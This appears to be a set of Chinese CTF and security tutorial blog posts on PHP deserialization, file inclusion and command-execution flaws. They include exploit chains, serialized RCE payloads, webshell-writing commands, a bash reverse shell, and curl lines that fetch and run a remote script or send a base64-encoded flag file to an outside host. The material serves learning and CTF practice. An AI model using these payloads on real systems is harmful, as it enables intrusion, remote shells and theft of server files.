（3）存储引擎PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项session.save_handler来进行确定的，默认是以文件的方式储存。储存的文件是以sess_PHPSESSID来进行命名的，文件的内容就是session值得序列化之后得内容。 session.serialize_handler有如下三种取值： &lt;?php error_reporting(0); in_set('session.serialize_handeler','php_binary');//这里可以换不同的存储引擎 session_start(); $_SESSION['username']=$_GET['username']; ?&gt; 每种存储引擎存储的内容格式： 3.phar反序列化phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起php对象注入漏洞 phar文件的结构： -stub：phar文件标识，前面内容不限，但是必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件 -manifest：压缩文件的属性等信息，以序列化的形式储存自定义的meat-data，这里就是漏洞利用的关键点 -contents：压缩文件的内容 -signature：签名，在文件末尾 生成phar文件 一定要将php.ini中的phar.readonly选项设置为Off &lt;?php class h3{ } @unlink(\"phar.phar\"); $phar= new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php__HALT_COMPILER();?&gt;\");//设置stub，添加gif文件头 $o=new h3(); $phar-&gt;setMetadata($o);//将自定义meat-data存入manifest $phar-&gt;addFromString(\"test.txt\",\"test\");//添加要压缩的文件 $phar-&gt;stopBuffering(); ?&gt; ##二、反序列化漏洞 1.反序列化成因主要是反序列化过程中某些参数可控，传入构造的字符串，从而控制内部的变量设置函数，执行想要的操作 （1）phar反序列化漏洞造成原因漏洞出发点在使用phar://协议读取文件的时候，文件内容黑背解析成为phar对象，然后phar对象内的Meta-data信息会被反序列化。当内核调用phar_parse_metadata()解析met-adata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成漏洞 2.反序列化漏洞（1）PHP反序列化漏洞&lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; 我们可以简单的分析一下代码 定义了一个class类，类中有两个私有变量method和args 有三个魔术方法： function __construct($method, $args) //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() //析构函数当对象被销毁时会被自动调用 { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function __wakeup() //unserialize()时会被自动调用 { $this-&gt;args = array(\"127.0.0.1\"); } 分析代码段中host的来源，想办法利用system()构成RCE &lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct()//析构函数当对象被销毁时会被自动调用 { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() //unserialize()时会被自动调用 { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; 我们观察代码可知： GET方法获取参数a，并且将其反序列化。 但是再执行反序列化的时候，会自动调用__wakeup()魔术方法，把args的值改为127.0.0.1 无论我们怎么构造payload，system()执行的命令都是ping -c 2 127.0.0.1 这时我们可以利用到CVE-2016-7124漏洞 适用版本： PHP5&lt;5.6.25、PHP7&lt;7.0.1 当成员属性数目大于实际数码时可绕过__wakeup方法 就可以构造恶意payload来RCE 这里还有个小知识点|管道符 把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出。 所以我们可以构造序列化了 &lt;?php class home{ private $method=\"ping\"; private $args=array(\"|calc\"); } serialize(new home()); O:4:\"home\":2:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} 需要跳一下__wakeup()把成员属性数目改为3 O:4:\"home\":3:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} URL编码一下 O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D 成功RCE （2）session反序列化漏洞当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以php_serialize序列化存储session，以PHP反序列化读取session，造成反序列化攻击 例子： phpinfo： s1.php： &lt;?php highlight_file(__FILE__); error_reporting(0); ini_set(\"session.serialize_handler\",'php_serialize'); session_start(); $_SESSION[\"h3\"]=$_GET[\"u\"]; ?&gt; s2.php： &lt;?php highlight_file(__FILE__); session_start(); class session{ var $var; function __destruct(){ eval($this-&gt;var); } } ?&gt; 这里需要说一下unserialize的特性，在执行unserialize的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略 a:1:{s:2:\"h3\";s:52:\"|O:7:\"session\":1:{s:3:\"var\";s:15:\"system('calc');\";}\";} exp： &lt;?php class session{ var $var=\"system('calc');\"; } echo \"|\".serialize(new session()); 执行结果: 上文可以给$_SESSION赋值，若代码中不存在给$_SESSION赋值可以利用uplode_process机制，可以在$_SESSION中创建一个键值对，其中的值可以控制 &lt;?php $key=ini_get(\"session.upload_progress.prefix\") . ini_get(\"session.upload_progress.name\"); var_dump($_SESSION[$key]); ?&gt; （3）phar反序列化利用条件： -phar文件能够上传到服务器 -要有可用的魔术方法作为“跳板” -文件操作函数的参数可控，且：/ \\ 等特殊字符没有被过滤 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下 例题:[SWPUCTF 2018]SimplePHP 存在任意文件读取 先来读取一下upload_file.php &lt;?php include 'function.php'; upload_file(); ?&gt; 再来读取一下function.php &lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) { //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; } } } ?&gt; 再读取一下base.php 发现了提示 回头再来看class.php &lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = \"index.php\"; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?&gt; 在Test类中存在敏感操作 public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } 可以反向推poc链 通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知__get-&gt;get-&gt;file_get，所以关键是触发__get方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法 class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } public function __toString() //把类当作字符串使用时触发 { $content = $this-&gt;str['str']-&gt;source; return $content; } 查看一下怎么能够触发__toString()方法 public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } 知要echo test即可 整条链子为 C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get() exp如下 &lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $a= new C1e4r(); $b= new Show(); $c= new Test(); $c-&gt;params['source'] = \"/var/www/html/f1ag.php\"; $a-&gt;str = $b; $b-&gt;str['str'] = $c; $phar = new Phar(\"exp.phar\"); //生成phar文件 $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); $phar-&gt;setMetadata($a); //触发头是C1e4r类 $phar-&gt;addFromString(\"exp.txt\", \"test\"); //生成签名 $phar-&gt;stopBuffering(); ?&gt; 修改生成得phar文件后缀 上传成功后回到文件读取点来读phar文件 拿到base64加密得flag 反序列化字符逃逸一、概念在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。 二、字符变多例子： 该题源码如下 &lt;?php include 'flag.php'; function filter($string){ return str_replace('x','yy',$string); } $username=$_GET['u']; $password=\"aaa\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); echo $r; $a= unserialize($r); if ($a[1]==='admin'){ echo $flag; } highlight_file(__FILE__); ?&gt; 文件包含了flag 然后filter()方法，会将序列化字符串中的x替换为yy，可能会导致字符串长度 我们试着传入u=admin 序列化为： a:2:{i:0;s:5:\\\"admin\\\";i:1;s:3:\\\"aaa\\\";} 反序列化后 a[1]不等于”admin” 没有满足条件 我们构造一下数组 &lt;?php $a= array('a',\"admin\"); echo serialize($a); a:2:{i:0;s:1:\"a\";i:1;s:5:\"admin\";} 但是我们只有一个参数username可控 可以利用字符串逃逸 复制自己想要构造的字符串 \";i:1;s:5:\"admin\";} 按照长度添加字符串，已知长度为19 则在前方填充19个x 'xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";} 测试一下 &lt;?php $a= array('xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";}',\"a\"); $s= serialize($a); $v = str_replace('x','yy',$s); echo $v; 运行结果 a:2:{i:0;s:38:\"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\";i:1;s:5:\"admin\";}\";i:1;s:1:\"a\";} 可以看到已经逃逸出来了 这里利用了序列化的特性 反序列化看一下 array(2) { [0] =&gt; string(38) \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\" [1] =&gt; string(5) \"admin\" } 可以观察整个数据的变化 成功逃逸。获得flag 三、字符变少也是拿一道题做例子 &lt;?php error_reporting(0); include 'flag.php'; function filter($string){ return str_replace('sec','',$string); } $username=$_GET['u']; $password=$_GET['p']; $auth=\"guest\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); $a=unserialize($r); if($a[2]==='admin'){ echo flag; } highlight_file(__FILE__); ?&gt; 跟上一道题差不多 先随意构造一下争取的payload： &lt;?php $a= array(\"u\",\"p\",\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); 运行后拿到所需部分 \";i:2;s:5:\"admin\";} 需要我们传入的payload u=xxx&amp;p=xxxx 已知两个可控值中间的部分不变（可能会多一位） \";i:1;s:1:\" 这里可以利用替换方法换成空值从而完成逃逸 &lt;?php $a= array(\"secsecsecsec\",'\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}',\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); 执行结果 a:3:{i:0;s:12:\"secsecsecsec\";i:1;s:31:\"\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}\";i:2;s:5:\"admin\";} 可以看到已经完成了逃逸 反序列化一下看看 array(3) { [0] =&gt; string(12) \"\";i:1;s:31:\"\" [1] =&gt; string(1) \"p\" [2] =&gt; string(5) \"admin\" } a[2]=admin 拿到flag","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://h3h3qaq.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"PHP文件包含漏洞基础","slug":"PHP文件包含漏洞基础","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-11T02:31:30.277Z","comments":true,"path":"posts/f4224d8e.html","link":"","permalink":"https://h3h3qaq.github.io/posts/f4224d8e.html","excerpt":"","text":"一、文件包含漏洞文件包含主要是为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。 二、漏洞产生原因服务器在执行PHP文件的时候，用户可控文件的参数，并且没有严格的检验和过滤，或者被Bypass，操作一些敏感文件来导致文件泄露和恶意代码注入等危害 举一个简单的例子 &lt;?php $filename = $_GET['page']; include($filename); ?&gt; 这里的filename参数没有经过过滤，直接赋值给include()函数，我们就可以修改filenname的值，执行其他操作 我们在同目录下创建一个info.txt 内容如下 这样我们只需要把info.txt包含进去即可解析 三、PHP常用的包含函数在php中，常用的为以下4个函数 include() include_once() require() require_once() 其中include和require的区别主要是include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 include_once，require_once这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 四、漏洞利用文件包含利用有两种 1.包含本地服务器的文件 2.包含其他服务器的文件 而且，包含的时候，不一定要包含php文件 只要文件中有一块完整的php代码即可 例如a.txt 内容为 &lt;?php phpinfo(); ?&gt; 也是可以的 1.包含本地服务器的文件举一个例子，利用CTFSHOW的靶机 &lt;?php if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } 这里没有做任何限制，我们可以读取任意文件（罗列一些常用的，其他的师傅们可以自行收集） /etc/apache2/* #Apache配置文件，可以获知Web目录、服务端口等信息 /etc/nginx/* #Nginx配置文件，可以获知Web目录、服务端口等信息 /etc/crontab #定时任务文件 /etc/environment #环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况 /etc/hostname #主机名 /etc/hosts #主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名 /etc/issue #系统版本信息 /etc/mysql/* #MYSQL配置文件 /etc/php/* #PHP配置文件 /proc 目录 #/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可 /proc/[pid]/cmdline #cmdline可读出比较敏感的信息 # ssh日志，攻击方法： ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1 /var/log/auth.log # apache日志 /var/log/apache2/[access.log|error.log] https://www.anquanke.com/post/id/231407 这里可以读取任意文件，我们可以试着读/etc/passwd 2.包含远程服务器的文件这里需要前提 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 这里可以本地测试一下，利用虚拟机做远程服务器 &lt;?php error_reporting(0); highlight_file(__FILE__); $filename = $_GET['page']; Include($filename); ?&gt; 这里存在文件包含漏洞 “服务器”上存在webshell 传参： http://localhost/include.php?page=http://192.168.179.129/1.php 可以看到成功包含到了webshell 3.限制后缀名例子 &lt;?php error_reporting(0); highlight_file(__FILE__); $filename = $_GET['page']; include($filename. \".H3h3QAQ\"); ?&gt; 可以看到，在进行包含文件的时候文件名后缀进行了拼接，强制后缀为H3h3QAQ 所以我们需要Bypass (1).%00截断需要PHP&lt;5.3.4并且magic_quotes_gpc = Off /include.php?page=info.txt%00 (2).长度截断PHP版本&lt;=5.2.? Windows下目录最大长度为256字节，超出的部分会被丢弃掉Linux下目录最大长度为4096字节，超出的部分会被丢弃掉 构造payload的时候超出限制即可 类似于 /include.php?page=info.txt....................*n (3).伪协议zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码） phar://文件路径/phar文件名称/phar内的文件名称 phar://协议与zip://类似，同样可以访问zip格式压缩包内容 多配合在上传题使用 若发现只有jpg、png才可以上传文件 则可以利用phar伪协议 写一个shell 将后缀名改成.php 再将其压缩，再改成*.jpg、*.png 此时可以上传提示成功后，利用菜刀添加/include.php?file=phar*://***/a.png/a即可 ?file=zip://D:\\zip.jpg%23phpinfo ?file=phar://zip.zip/phpinfo 4.限制前缀例如../被过滤 可以利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ 或者二次编码 ../ %252e%252e%252f 5.PHP伪协议(1).file:// 协议用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 POC /include.php?file=file://phpinfo.txt /include.php?file=http://127.0.0.1/phpinfo.txt (2).php://协议allow_url_include :仅php://input php://stdin php://memory php://temp 需要on php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 协议 作用 php://input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=\"multipart/form-data\" 的时候php://input 是无效的。 php://output 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 1.php://filterphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 对于php://来说，是支持多种过滤器嵌套的 php://filter/[read|write]=[过滤器1]|[过滤器2]/resource=文件名称（包含后缀名） #如果|被过滤掉了，可以使用多过滤器: php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=文件名称（包含后缀名） 嵌套过程的执行流程为从左到右 其实是可以简写成这样的php://filter/[过滤器] ，php会自己进行识别。 过滤器列表: 过滤器名称 说明 类别 版本 string.rot13 rot13转换 字符串过滤器 PHP&gt;4.3.0 string.toupper、string.tolower 大小写互转 字符串过滤器 PHP&gt;5.0.0 convert.base64-encode、convert.base64-decode base64编码转换 转换过滤器 PHP&gt;5.0.0 convert.quoted-printable-encode、convert.quoted-printable-decode URL编码转换 转换过滤器 PHP&gt;5.0.0 convert.iconv.编码1.编码2 任意编码转换 转换过滤器 PHP&gt;5.0.0 zlib.deflate、zlib.inflate zlib压缩 压缩过滤器 PHP&gt;5.1.0 bzip2.compress、bzip2.decompress zlib压缩 压缩过滤器 PHP&gt;5.1.0 6.PHP伪协议常用函数file_get_contents() file_put_contents() readfile() fopen() file() show_source() highlight_file() 五、参考链接 https://blog.csdn.net/qq_42181428/article/details/87090539 https://blog.csdn.net/bmth666/article/details/104616201 https://www.anquanke.com/post/id/231407#h3-6 https://www.cnblogs.com/jzking121/p/15144416.html https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430 https://segmentfault.com/a/1190000018991087","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://h3h3qaq.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"PHP代码执行漏洞","slug":"PHP代码执行漏洞","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-10T14:51:35.877Z","comments":true,"path":"posts/12a5c357.html","link":"","permalink":"https://h3h3qaq.github.io/posts/12a5c357.html","excerpt":"","text":"代码命令执行函数代码执行 函数 说明 例子 ${php代码} ${phpinfo}; mixed eval(string $code) 把字符串code作为php代码执行 eval(‘phpinfo();’); bool assert(mixed $assertion [, string $description]) assert()会检查指定的assertion并在结果为FALSE时采取适当的相应。如果assertion是字符串，它将会被assert()当作PHP代码来执行 assert(‘system(“whoami”)’); mixed preg_replace(mixde $patterm,mixed $replacement,mixed $subject [, int $limit =-1 [, int&amp;$count]]) 搜索subject中匹配pattern的部分，以replacement进行替换。当$pattern处存在e修饰符是(5.5.0版本/e修饰符已经被弃用了)，$replacement会被当做php代码执行 preg_replace(“/test/e”,”system(‘whoami’)”,’test’); mixed call_user_func(callable $callback [, mixed $paramenter [, mixed $..]]) 第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传递 call_user_func(‘system’,’whoami’); mixed call_user_func_array(callable $callback,arry $param_arr) 把第一个参数作为回调函数（callback）调用，把参数数组(param_arr)作为回调函数的参数传入 call_user_func_array(‘system’,array(‘whoami’)); string creat)function( string $args,string $code) 在php中使用creat_function()创建一个匿名函数(lambda-style)，如果对参数为进行严格的过滤审查，攻击者可以通过提交特殊字符串给creat_function()从而导致任意代码执行 creat_function(‘$test’,’};phpinfo();/*’); array array_map(callable $callback ,array $array1 [, array $…]) 为数组的每个元素应用回调函数。其返回值为数组，是为array1每个元素应用callback函数之后的数组。callback函数形参的数量和传给array_map()数组数量，两者必须一样。 array_map(‘system’,array(‘whoami’)); array array_filter (array $array [, callable $callback [, int $flag=0]]) 依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保持不变 array_filter(array(‘whoami’),’system’); bool usort( array &amp;$array,callabe $value_compare_func) 通过用户自定义的比较函数对数组进行排序 $a=array(‘whoami’,’t’);usort($a,”system”); bool uasort(array &amp;$array, callable $value_compare_func) 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 $a=array(‘whoami’,’t’);uasort($a,”system”); 命令执行 函数 说明 例子 string system( string $command [, int &amp;$return_var] ) command是要执行的命令。如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中，显示输出 system(‘whoami’); void passthru ( string $command [, int &amp;$return_var]) 执行外部程序并且显示原始输出 passthru(‘whoami’); void pcntl_exec(string $path [, arry $args [, array $envs]] ) path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本args是一个要传递给程序的参数的字符串数组。该模块不能在非Unix平台（Windows）上运行 pcntl_exec(“/bin/cat/etc/passwd”,”r”);$read=fread($handle,2096);echo $read;pclose($handle); string exec (string $command [, array &amp;$output [, int &amp;$return_bar]]) 执行所指定的命令，并返回结果的最后一行内容，不显示输出 echo exec(‘whoami’); string shell_exec(string $cmd) 通过shell环境执行命令，并且将完整的输出以字符串的方式返回 echo shell_exec(‘whoami’); resource popen(string $command,string $mode) 打开一个指向进程的管道，该进程该进程由派生给定的command命令执行而产生。后面的mode，当为’r’，返回的文件指针等于命令的STDOUT，当为’w’，返回的文件指针等于命令的STDIN $handle = popen(“bin/cat/etc/passwd”,”r”);$read=fread($handle,2096);echo $read;pclose($handle); 反引号 echo whoami;(md语法问题) 无回显命令执行&lt;?php highlight_file(__FILE__); if (isset($_GET['cmd'])){ shell_exec($_GET['cmd']); } 该环境为一个无回显的命令执行 所以我们需要判断命令是否执行成功 以下方式可以判断是否成功RCE 判断1. 延迟 ?cmd=sleep 3 通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行 2.HTTP请求 (1).在公网服务器监听端口 nc -lvp port (2).向目标服务器发起http请求，执行curl命令 ?cmd=curl ip:port 如果向目标服务器发起htpp请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞 3.DNS请求 dnslog ?cmd=ping 9y8y3k.dnslog.cn 利用1.使用 &gt;或&gt;&gt; ?cmd=cat flag.php &gt; flag.txt 2.mv或cp ?cmd=mc flag.php flag.txt ?cmd=cp flag.php flag.txt 3.打包压缩 (1).tar打包或tar打包并压缩 tar cvf flag.tar flag.php tar zcvf flag.tar.gz flag.php (2).zip压缩 zip flag.zip flat.php 4.cut and sleep sed指定读取文件的第几行 cat flag.php|sed -n '2p' 提取每一行的第三个字节 cut -b 3 flag文件 最后 cat flag.php|sed -n '2p'|cut -b 1 exp import requests import time url =\"\" flag= \"\" for i in range (6,65): for j in range(32,127): data=\"a%3D`cat flag.php|sed -n '2p'|cut -b {}`;[$a %3D \\\"{}\\\"] %26%26 sleep2\".format(i,chr(j)) start_time=time.time() requests.get(url=url+data) spend_time=end_time -start_time if spend_time&gt;=2: flag+=chr(j) print(flag) 写入webshell直接写入?cmd = echo \"&lt;?php @eval(\\$_POST[h3]);?&gt;\"&gt;webshell.php 外部下载wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名 Dnslog1.命令执行时要避免空格，空格会导致空格后面的命令执行不到； 2.将读取的文件命令用反引号``包括起来； 3.拼劲的域名又长度限制 用&lt;替换读取文件中的空格，且对输出结果base64编码 curl `cat&lt;flag.php|base64` 拼接域名（最终构造结果） curl `cat&lt;flag.php|base64`. 反弹shell1.首先在公网服务器用nc指令监听端口 nc -lvp port 2.然后在公网服务器上写一个文件（qwzf文件） bash -i &gt;&amp;/dev/tcp/ip/poat 0&gt;&amp;1 3.在浏览器执行 ?cmd=curl ip:port/qwzf|bush 有限字符的命令执行##14位可控 &lt;?php highlight_file(__FILE__); if (strlen($_GET[1])&lt;15){ echo strlen($_GET[1]); echo shell_exec($_GET[1]); }else{ exit(\"too long~\"); } 虽然只能传入14个字符 但是并没有限制命令执行次数 所以我们可以通过Linux下的&gt;符号与&gt;&gt;符号写入一段webshell到指定文件。 echo \\&lt;?php&gt;1 echo eval\\(&gt;&gt;1 echo \\$_GET&gt;&gt;1 echo \\[1\\]&gt;&gt;1 echo \\)\\;&gt;&gt;1 mv 1 1.php 本地起环境 经测试 这种换号的php文件也可以运行 写入后蚁剑连接靶机 拿到flag 7位可控&lt;?php highlight_file(__FILE__); if (strlen($_GET[1])&lt;=7){ echo strlen($_GET[1]); echo '&lt;hr/&gt;'; echo shell_exec($_GET[1]); }else{ exit(\"too long~\"); } 小知识点 &gt;a #虽然没有输出但是会创建a这个文件 ls -s #ls基于事件排序（从晚到早） sh a #sh会把a里面的每行内容当作命令来执行 使用\\进行命令拼接 #l\\s=ls base64 #使用base64编码避免特殊字符 目标写入一句话木马 &lt;?php eval($_GET[1]); base64编码后 PD9waHAgZXZhbCgkX0dFVFsxXSk7 我们需要执行 echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php payload: &gt;hp &gt;1.p\\\\ &gt;d\\&gt;\\\\ &gt;\\ -\\\\ &gt;e64\\\\ &gt;bas\\\\ &gt;7\\|\\\\ &gt;XSk\\\\ &gt;Fsx\\\\ &gt;dFV\\\\ &gt;kX0\\\\ &gt;bCg\\\\ &gt;XZh\\\\ &gt;Agz\\\\ &gt;waH\\\\ &gt;PD9\\\\ &gt;o\\ \\\\ &gt;ech\\\\ ls -t&gt;0 sh 0 5位可控&lt;?php $sandbox='/var/www/html/sandbox'.md5(\"orange\".$_SERVER); $_SERVER($sandbox); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd'])&amp;&amp;strlen($_GET['cmd'])&lt;=5){ @exec($_GET['cmd']); }else if (isset($_GET['reset'])){ @exec('/bin/rm -rf'.$sandbox); } highlight_file(__FILE__); ?&gt; 知识点： 1.输入通配符* ,Linux会把第一个列出的文件名当做命令,剩下的文件名当作参数 2.通过rev来倒置输出内容(rev命令将文件中的每行内容以字符为单位反序输出) 3.用dir来代替ls不换行输出;rev将文件内容反向输出;在用ls是,写到a时每个文件名都是单独一行 &gt;rev echo '1233'&gt;v *v (等同于命令:rev v) 我们需要把 echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php 拆分然后执行 payload &gt;dir &gt;f\\&gt; &gt;ht- &gt;sl *&gt;v &gt;rev *v&gt;a &gt;hp &gt;p\\\\ &gt;1.\\\\ &gt;\\&gt;\\\\ &gt;-d\\\\ &gt;\\\\\\ &gt;64\\\\ &gt;se\\\\ 